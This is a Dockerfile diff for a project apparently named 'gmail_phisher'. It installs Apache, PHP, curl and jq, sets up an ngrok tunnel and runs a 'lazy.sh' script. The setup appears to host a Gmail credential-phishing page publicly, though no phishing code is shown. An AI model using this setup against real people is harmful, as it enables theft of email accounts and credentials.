@@ -6,8 +6,10 @@ ENV LC_ALL=C.UTF-8
 
 WORKDIR /home/gmail_phisher
 
+COPY . .
+
 RUN apt update \
-  && apt install --yes wget unzip software-properties-common \
+  && apt install --yes jq curl wget unzip software-properties-common \
   && add-apt-repository --yes ppa:ondrej/php \
   && apt update \
   && apt install --yes apache2 php libapache2-mod-php \
@@ -18,4 +20,6 @@ RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip \
   && mv ngrok /usr/bin/ngrok \
   && ngrok authtoken "${NGROK_TOKEN}"
 
-CMD tail -f /dev/stdout
+RUN chmod +x lazy.sh
+
+CMD ./lazy.sh
